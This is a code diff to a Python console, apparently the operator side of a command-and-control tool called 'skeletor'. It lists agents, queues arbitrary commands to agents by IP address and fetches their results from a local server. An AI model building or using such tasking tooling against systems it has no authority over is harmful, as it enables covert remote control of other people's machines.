@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
-import requests, json
+#Prototype of a interactive manager tool for skeletor.
+
+import requests, re, json
 
 URL = "http://127.0.0.1:80"
 
@@ -23,6 +25,10 @@ def exit_manager():
     print("Exiting...")
     exit(0)
 
+def validate_ip(ip):
+    ipv4_pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
+    return re.match(ipv4_pattern, ip) is not None
+
 def get_agent_status():
     try:
         agents = requests.get(URL + "/get-agents").json()
@@ -32,7 +38,8 @@ def get_agent_status():
     if agents:
         for agent in agents:
             print(f"Agent ID: {agent['agent_id']}")
-            print(f"Agent Status: {agent['status']}")
+            print(f"Agent Status: {agent['status']}\n")
+
             
 def send_cmd():
     requests.post(URL + "/clear-targets")
@@ -57,16 +64,32 @@ def send_cmd():
                 print("Command not sent.")
                 return
             targets = targets.strip().split(",")
-            requests.post(URL + "/set-targets", json={"ips": targets})
+            for t in targets:
+                if t.strip() != "":
+                    data = {'agent_id': t, 'action': 'command', 'command': command}
+                    requests.post("http://localhost:80/make-task", json=data)
         else:
-            pass
+            for t in targets:
+                if t.strip() != "":
+                    data = {'agent_id': t, 'action': 'command', 'command': command}
+                    requests.post("http://localhost:80/make-task", json=data)
+
     for target in requests.get("http://localhost:80/targets").text.split("\n"):
             data = {'agent_id': target, 'action': 'command', 'command': command.strip()}
             requests.post("http://localhost:80/make-task", json=data)
     requests.post(URL + "/clear-targets")
 
 def get_result():
-    pass
+    agent = input("Enter Agent ID to get last result from: ").strip()
+    if validate_ip(agent):
+        data = {"agent_id": agent}
+        result = requests.post("http://localhost:80/get-result", json=data).json()
+        result_str = "\n" + "Agent: " + agent + "\n" + "Command: " + result.get('command') + "\n" + "Result: " + result.get('result') + "\n"
+        print(result_str)
+    else:
+        print("Invalid Agent ID. Please enter the IPv4 address of the agent\n")
+        get_result()
+
 
 def main():
     skeletor_banner()
